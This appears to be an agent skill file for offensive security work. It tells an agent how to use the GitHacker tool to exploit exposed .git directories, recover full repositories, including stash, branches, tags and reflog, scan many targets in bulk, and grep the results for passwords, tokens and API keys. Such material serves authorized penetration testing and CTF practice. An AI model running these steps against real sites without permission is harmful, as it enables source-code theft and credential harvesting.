---
name: githacker-git-leak
description: "Uses GitHacker to exploit .git directory exposure vulnerabilities and recover the target source code. GitHacker is a multi-threaded .git leak exploitation tool that recovers more complete content than git-dumper/GitHack — including the stash, all branches, tags, and the reflog. Even when the target has directory listing disabled (403), branches and tags can be recovered through brute-force enumeration. Use this skill when /.git/HEAD or /.git/config returns 200, when a .git/ directory is found in the directory listing, or when version-control-related files are discovered during recon. After recovering the source code, you can look for hardcoded credentials, API keys, and database connection strings"
zh-signals: "使用 GitHacker 利用 .git 目录泄露并完整恢复源码、分支与 stash。信号:.git泄露,GitHacker,源码恢复,分支枚举,凭据搜索。"
when-to-use: >-
  Use when a target exposes /.git/HEAD or /.git/config, when a .git directory is discovered during recon, or when recovering source code, branches, tags, stash, and reflog from a git leak.
metadata:
  tags: "githacker,git,leak,exposure,source-code,source-code,dump,recovery,web,information-disclosure,.git,.git/HEAD,.git/config,git-directory,version-control,git-dumper,git-hack,source-recovery,commit-history,code-leak"
  category: "tool"
---

# GitHacker .git Leak Exploitation

GitHacker focuses on **complete recovery** from .git directory exposure — not only source code, but also the stash, all branches/tags, and the reflog. Passwords and debug code that developers deleted often hide in these places.

Project URL: https://github.com/WangYihang/GitHacker

## Installation

```bash
pip install GitHacker
# or
f8x -install githacker
```

## Basic Usage

```bash
# Quick exploitation
githacker --url http://target/.git/ --output-folder result

# Brute-force branch/tag names (must be enabled when the target has directory listing disabled)
githacker --brute --url http://target/.git/ --output-folder result

# Bulk targets (one URL per line)
githacker --brute --url-file websites.txt --output-folder result
```

## Docker Usage (Recommended)

A remote .git directory may contain injected malicious content (such as hooks scripts), so running it in Docker is safer:

```bash
docker run -v $(pwd)/results:/tmp/githacker/results \
  wangyihang/githacker \
  --brute --output-folder /tmp/githacker/results \
  --url http://target/.git/
```

## Post-Recovery Audit Workflow

The directory recovered by GitHacker is a complete git repository that can be audited directly with git commands:

```bash
cd result/target/

# 1. Review the commit history (focus on deleted sensitive information)
git log --oneline --all
git log -p --all -S "password"
git log -p --all -S "secret"
git log -p --all -S "flag"

# 2. Review all branches (development/test branches often hold sensitive information)
git branch -a
git checkout dev       # switch to the development branch and take a look

# 3. Review the stash (changes developers parked temporarily)
git stash list
git stash show -p stash@{0}

# 4. Review the reflog (find commits that were reset away)
git reflog
git show <commit-hash>

# 5. Search for credentials
grep -rn "password\|secret\|token\|api_key\|flag{" .
```

## Comparison with Other Tools

| Capability | GitHacker | git-dumper | GitHack |
|------|-----------|------------|---------|
| Source code recovery | ✅ | ✅ | ✅ |
| Stash recovery | ✅ | ✅ | ❌ |
| All branches | ✅ (brute-force enumeration) | ❌ | ❌ |
| All tags | ✅ (brute-force enumeration) | ❌ | ❌ |
| Reflog | ✅ | ✅ | ❌ |
| No directory listing | ✅ | ✅ | ✅ |

git-dumper is good for quickly grabbing the source code; GitHacker's `--brute` mode covers more branches and tags, which suits deep audits.

## Decision Tree

```
Does /.git/HEAD return 200?
├─ Directory listing enabled (200) → exploit with githacker directly
├─ Directory listing disabled (403) → githacker --brute (brute-force enumerate branches/tags)
├─ Need the source code quickly → git-dumper also works
└─ Scan multiple targets in bulk → githacker --url-file websites.txt
```
